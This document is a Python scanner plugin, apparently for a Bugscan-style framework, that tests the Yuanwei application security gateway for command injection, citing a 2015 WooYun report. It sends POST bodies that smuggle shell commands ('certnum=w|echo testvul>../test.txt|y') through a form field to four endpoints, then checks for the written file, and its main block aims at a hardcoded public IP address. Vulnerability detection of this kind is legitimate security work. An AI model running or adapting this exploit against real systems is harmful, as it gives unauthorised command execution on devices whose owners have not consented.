#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 远为应用安全网关(&国富安应用安全网关)4处命令执行
refer: http://www.wooyun.org/bugs/wooyun-2015-0143062
description:
    
'''

import re

def assign(service, arg):
    if service == 'yuanwei_gateway':
        return True, arg

def audit(arg):
    content_type = 'Content-Type: application/x-www-form-urlencoded'
    urls = [
        arg + 'ipsecconfig/tun/add_tun_write.php',
        arg + 'ipsec.bak/tun/add_tun_write.php',
        arg + 'ipsecconfig/usertun/add_tun_write.php',
        arg + 'ipsec.bak/usertun/add_tun_write.php'
    ]
    posts = [
        'certnum=w|echo%20testvul0>../test.txt|y',
        'certnum=w|echo%20testvul1>../../ipsecconfig/test.txt|y',
        'certnum=w|echo%20testvul2>../test.txt|y',
        'certnum=w|echo%20testvul3>../../ipsecconfig/test.txt|y'
    ]
    verify_url = arg + 'ipsecconfig/test.txt'
    for i in range(len(urls)):
        url = urls[i]
        post = posts[i]
        code, head, res, err, _ = curl.curl2(url, post, header=content_type)
        if (code != 200) and (code != 302):
            continue
        #验证
        code, head, res, err, _ = curl.curl2(verify_url)
        #print res
        if (code == 200) and ('testvul'+str(i) in res):
            security_hole('Command execution: ' + url + ' POST:' + post)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('yuanwei_gateway','http://222.170.47.230:8888/')[1])